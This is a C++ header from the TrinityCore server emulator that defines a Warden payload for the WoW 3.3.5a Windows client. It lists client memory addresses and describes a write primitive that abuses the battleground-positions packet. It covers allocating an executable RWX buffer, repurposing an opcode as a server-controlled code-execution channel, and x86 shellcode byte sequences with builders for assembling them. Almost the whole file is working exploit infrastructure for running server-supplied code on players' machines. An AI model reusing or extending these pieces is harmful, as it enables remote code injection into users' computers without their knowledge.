/*
 * This file is part of the TrinityCore Project. See AUTHORS file for Copyright information
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 * FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for
 * more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef WARDEN_WIN_DEFINES_H
#define WARDEN_WIN_DEFINES_H

#include "Define.h"
#include <array>

// WoW 3.3.5a Windows client address map (image base 0x00400000).
namespace WardenPayload
{
    // Image-relative addresses (VA - 0x00400000).
    // Passed to RunClientFunction; the Warden module applies the base before branching.
    namespace Rva
    {
        enum : uint32
        {
            // Installs the MSG_BATTLEGROUND_PLAYER_POSITIONS packet handler used as write-primitive.
            BgPositionHandlerInstall = 0x0014E720,
            // Frame-advance trampoline — flushes the previous call before dispatching the next.
            FrameExecute = 0x00419210,
            // Loader staging region (VA 0x00DD1000); written by exploit, executed once, then wiped.
            StagingLoader = 0x009D1000,
        };
    }

    // Absolute virtual addresses used directly in shellcode and packet fields.
    namespace Va
    {
        enum : uint32
        {
            // Unregisters MSG_BATTLEGROUND_PLAYER_POSITIONS after the exploit write.
            BgPositionHandlerRemove = 0x0054E220,
            // NetClient::RegisterPacketHandler(opcode, primary_fn, secondary_fn)  cdecl.
            RegisterPacketHandler = 0x006B0B80,
            // [IAT] VirtualAlloc — allocates the persistent PAGE_EXECUTE_READWRITE buffer.
            VirtualAllocIAT = 0x009DF238,
            // Internal memset-equivalent: memset(dst, fill, size)  cdecl, 3 args.
            MemsetRoutine = 0x0040BB80,
            // Loader is written here by the exploit, executed once, then wiped.
            StagingBase = 0x00DD1000,
            // Caches the RWX buffer pointer across reconnects; NULL on first run.
            PersistentSlot = 0x00DD0FFC,
            // Loader copies [PayloadCopySrc, PayloadCopySrcEnd) into the RWX buffer.
            PayloadCopySrc = 0x00DD15A0,
            PayloadCopySrcEnd = 0x00DD15FE, // exclusive
            // Returns a context value consumed by HandlerBufferPrepare.
            HandlerContextGetter = 0x00401170,
            // PrepareBuffer(code_ptr, context_result)  thiscall.
            HandlerBufferPrepare = 0x0047B560,
            // [IAT] Buffer allocator — likely CDataStore or equivalent.
            HandlerBufferAllocIAT = 0x009DF1C0,
            // [IAT] Buffer dispatcher — passes the allocated buffer downstream.
            HandlerDispatchIAT = 0x009DF294,
            // Return-value sentinel; points to ClientServices::s_accountName.
            AccountName = 0x00C79620,
        };
    }

    // Protocol layout constants for the loader/handler injection channel.
    namespace Protocol
    {
        enum : uint32
        {
            // CMSG_UNUSED5 repurposed as the server-controlled execution channel.
            CustomHandlerOpcode = 0x04B8,
            // Byte offset from RWX buffer start to the persistent packet handler entry point.
            HandlerEntryOffset = 0x20,
            // Byte offset into a CustomHandlerOpcode packet body where server-supplied code begins.
            PacketCodeOffset = 0x3E,
            // Player-count base that, combined with chunk count, triggers the write-primitive at Va::StagingBase.
            BgExploitBaseCount = 249298,
            // WARDEN_SMSG_MODULE_INITIALIZE sub-command: branch to a given RVA.
            ModuleInitSubCmdCallFunc = 4,

            // rel8 target for jnz at end of CheckCachedBuffer -> RegisterHandler.
            // = sizeof(AllocRwxBuffer) + sizeof(CacheBufferPtr) + sizeof(CopyPayload)
            JnzSkipAllocOffset = 0x2E,
            // rel8 target for jnz at end of CopyPayload -> loop start (negative displacement).
            // = -(loop body: MovChEdxPtr + MovEaxPtrCh + IncEdx + IncEax + CmpEdxImm32 + LE32 + Jnz + Imm8)
            JnzLoopBackOffset = 0xF2,

            // [ebp+0x08] holds the packet buffer pointer in the handler calling convention.
            PacketArgEbpOffset = 0x08,
            // [ebp+0x14] holds the dispatcher context object in the handler calling convention.
            ContextArgEbpOffset = 0x14,

            // Stack cleanup after a 3-argument cdecl call (3 * sizeof(uint32) = 12).
            CdeclThreeArgCleanup = 0x0C,
        };
    }

    // Windows API constants embedded in the VirtualAlloc and memset shellcode sequences.
    namespace Win32
    {
        enum : uint32
        {
            RwxBufferSize = 0x1000, // 4 KB: allocation size and staging wipe extent
            MemCommit = 0x1000, // MEM_COMMIT allocation type
            PageExecuteReadWrite = 0x40, // PAGE_EXECUTE_READWRITE protection flag
        };
    }

    // x86 instruction byte sequences used in the shellcode.
    // Sequences marked "prefix" require following operand byte(s) appended with operator+.
    struct X86
    {
        // ---- Single-byte: register push/pop ----
        static constexpr std::array<uint8, 1> PushEbp = { 0x55 };
        static constexpr std::array<uint8, 1> PushEbx = { 0x53 };
        static constexpr std::array<uint8, 1> PushEdi = { 0x57 };
        static constexpr std::array<uint8, 1> PushEax = { 0x50 };
        static constexpr std::array<uint8, 1> PushEcx = { 0x51 };
        static constexpr std::array<uint8, 1> PopEbp = { 0x5D };
        static constexpr std::array<uint8, 1> PopEbx = { 0x5B };
        static constexpr std::array<uint8, 1> PopEdi = { 0x5F };
        static constexpr std::array<uint8, 1> IncEax = { 0x40 };
        static constexpr std::array<uint8, 1> IncEdx = { 0x42 };
        static constexpr std::array<uint8, 1> Ret = { 0xC3 };

        // ---- Single-byte: opcode prefixes (require imm operand to follow) ----
        static constexpr std::array<uint8, 1> PushImm8 = { 0x6A }; // push imm8
        static constexpr std::array<uint8, 1> PushImm32 = { 0x68 }; // push imm32
        static constexpr std::array<uint8, 1> MovEaxImm32 = { 0xB8 }; // mov eax, imm32
        static constexpr std::array<uint8, 1> MovEdxImm32 = { 0xBA }; // mov edx, imm32
        static constexpr std::array<uint8, 1> StoreEaxMem32 = { 0xA3 }; // mov [imm32], eax
        static constexpr std::array<uint8, 1> Jnz = { 0x75 }; // jnz rel8

        // ---- Two-byte: register-to-register moves ----
        static constexpr std::array<uint8, 2> MovEbpEsp = { 0x89, 0xE5 };
        static constexpr std::array<uint8, 2> MovEspEbp = { 0x89, 0xEC };
        static constexpr std::array<uint8, 2> MovEbxEax = { 0x89, 0xC3 }; // mov ebx, eax
        static constexpr std::array<uint8, 2> MovEaxEbx = { 0x89, 0xD8 }; // mov eax, ebx
        static constexpr std::array<uint8, 2> MovEdiEax = { 0x89, 0xC7 }; // mov edi, eax

        // ---- Two-byte: calls and jumps ----
        static constexpr std::array<uint8, 2> CallEax = { 0xFF, 0xD0 };
        static constexpr std::array<uint8, 2> CallEbx = { 0xFF, 0xD3 };
        static constexpr std::array<uint8, 2> JmpEbx = { 0xFF, 0xE3 };
        static constexpr std::array<uint8, 2> CallMem32 = { 0xFF, 0x15 }; // call [imm32] — prefix

        // ---- Two-byte: compare / test ----
        static constexpr std::array<uint8, 2> TestEbxEbx = { 0x85, 0xDB };
        static constexpr std::array<uint8, 2> CmpEdxImm32 = { 0x81, 0xFA }; // cmp edx, imm32 — prefix

        // ---- Two-byte: memory load prefix (require imm32 address to follow) ----
        static constexpr std::array<uint8, 2> MovEbxMem32 = { 0x8B, 0x1D }; // mov ebx, [imm32]

        // ---- Two-byte: arithmetic prefix (require imm8 operand to follow) ----
        static constexpr std::array<uint8, 2> AddEaxImm8 = { 0x83, 0xC0 }; // add eax, imm8
        static constexpr std::array<uint8, 2> AddEbxImm8 = { 0x83, 0xC3 }; // add ebx, imm8
        static constexpr std::array<uint8, 2> AddEspImm8 = { 0x83, 0xC4 }; // add esp, imm8

        // ---- Two-byte: copy loop body ----
        static constexpr std::array<uint8, 2> MovChEdxPtr = { 0x8A, 0x2A }; // mov ch, byte ptr [edx]
        static constexpr std::array<uint8, 2> MovEaxPtrCh = { 0x88, 0x28 }; // mov byte ptr [eax], ch

        // ---- Two-byte: stack slot load prefix (require imm8 offset to follow) ----
        static constexpr std::array<uint8, 2> MovEbxEbpOff = { 0x8B, 0x5D }; // mov ebx, [ebp+imm8]
        static constexpr std::array<uint8, 2> MovEcxEbpOff = { 0x8B, 0x4D }; // mov ecx, [ebp+imm8]

        // ---- Common complete sequences ----
        static constexpr std::array<uint8, 2> PushZero = { 0x6A, 0x00 }; // push 0 (imm8 form)
    };

    // -----------------------------------------------------------------------
    // Compile-time byte-sequence builders.
    // operator+ concatenates two fixed-size byte arrays into one larger array, enabling shellcode sections to be written as flat + chains.
    // LE32 / Imm8 pack integer constants into their wire-format byte arrays.
    // -----------------------------------------------------------------------

    template<size_t N, size_t M>
    constexpr std::array<uint8, N + M> operator+(std::array<uint8, N> const& a, std::array<uint8, M> const& b)
    {
        std::array<uint8, N + M> result{};
        for (size_t i = 0; i < N; ++i)
            result[i] = a[i];
        for (size_t i = 0; i < M; ++i)
            result[N + i] = b[i];
        return result;
    }

    constexpr std::array<uint8, 4> LE32(uint32 addr)
    {
        return
        {
            static_cast<uint8>(addr         & 0xFFu),
            static_cast<uint8>((addr >>  8) & 0xFFu),
            static_cast<uint8>((addr >> 16) & 0xFFu),
            static_cast<uint8>((addr >> 24) & 0xFFu)
        };
    }

    constexpr std::array<uint8, 1> Imm8(uint32 value)
    {
        return { static_cast<uint8>(value) };
    }
}

#endif // WARDEN_WIN_DEFINES_H
